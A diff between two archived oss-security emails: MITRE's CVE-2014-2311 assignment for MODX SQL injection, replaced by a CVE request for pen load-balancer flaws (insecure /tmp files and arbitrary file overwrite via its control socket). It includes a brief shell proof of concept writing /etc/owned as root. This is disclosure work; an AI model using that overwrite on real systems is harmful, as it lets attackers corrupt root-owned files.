@@ -1,42 +1,51 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/03/09/3
-Message-Id: <201403090320.s293Jq8u026917@linus.mitre.org>
-Date: Sat, 8 Mar 2014 22:19:52 -0500 (EST)
-From: cve-assign@...re.org
-To: hanno@...eck.de
-Cc: cve-assign@...re.org, oss-security@...ts.openwall.com
-Subject: Re: CVE request: SQL injection in MODX Revolution before 2.2.13
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2014/03/12/14
+Message-Id: <E1WNq7J-0004Lk-Tq@ssh.steve.org.uk>
+Date: Wed, 12 Mar 2014 20:47:48 +0000
+From: Steve Kemp <steve@...ve.org.uk>
+To: oss-security@...ts.openwall.com
+Subject: CVE-Request - pen issues
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+  There are some minor issues reported in the pen-load-balancer,
+ which could use CVE Identifiers:
 
-> I'd like to have a CVE for the following issue:
-> http://forums.modx.com/thread/89486/modx-revolution-2-x-sql-injection#dis-post-492046
-> 
-> Release notes for fixed version:
-> http://modx.com/blog/2014/03/07/revolution-2.2.13/
-> 
-> I tried to find the corresponding git commit, but I was not successful.
-> It may be this one:
-> https://github.com/modxcms/revolution/commit/11a913feda16c99703dbf4d27328af888e698c5c
-> but I'm not sure.
+        https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=741370
 
-Use CVE-2014-2311.
+  1.  Insecure use of temporary files when requesting
+     websteats:
 
-- -- 
-CVE assignment team, MITRE CVE Numbering Authority
-M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.14 (SunOS)
+        } else if (!strcmp(p, "status")) {
+                p = webfile;
+                webfile = "/tmp/webfile.html";
+                webstats();
+        ...
 
-iQEcBAEBAgAGBQJTG9psAAoJEKllVAevmvmsip8IAIjjHx9tQpXp6E2GO74G3Y72
-OVr9s8rmQw6kL5ybsnQhpz0FJ+J70UrvkKrPBuWpR9WFnizLqjPD2mclRTWZq4Sh
-0KaaZeGOWS3/xxtgNKnettHnnwgZ4FYmgmgEio4kqP0ARGjm93JNT1DhjtJmHJi7
-s0FNrFfOJI8a8PCM4/dEAYEMD/l1bT/OV9D1pzvWOfeSbeZ9TIRId7Nw6c9jnF+I
-S6JfZJg38O/RaKlCdVwZEE6IncsYi8EIUHBWmIHkgcZizRywLCfs7PIrBLXgU/5l
-/xofamwjQrX5oW2i9rPc9Ibg8p3Iz6v2VMXXfslV6MUB+fXzFEdGi55BbqqxukI=
-=1GJK
------END PGP SIGNATURE-----
+
+   2.  Insecure use of temporary files when invoking
+      the penctl command in the supplied CGI script:
+
+PENCTL=penctl
+...
+        $PENCTL $SERVER:$PORT status 2> /tmp/penctl.cgi
+..
+
+
+    3.  When a control-socket is configured (via "-C ip:port" added
+       to the pen command line) a user who can connect to that port
+       can overwrite arbitrary files as the user pen is launched as:
+
+shelob ~ $ sudo pen 4444 localhost:9000 -C 127.0.0.1:5043
+shelob ~ $ penctl 127.0.0.1:5043 write /tmp/meow
+shelob ~ $ penctl 127.0.0.1:5043 write /etc/owned
+shelob ~ $ ls -l /etc/owned /tmp/meow
+-rw-r--r-- 1 root root 1187 Mar 11 18:35 /etc/owned
+-rw-r--r-- 1 root root 1186 Mar 11 18:35 /tmp/meow
+
+  Please feel free to ask for details if they can be helpful,
+ versions are unknown, but the current version is v0.18.0
+
+Steve
+-- 
+http://www.steve.org.uk/
+
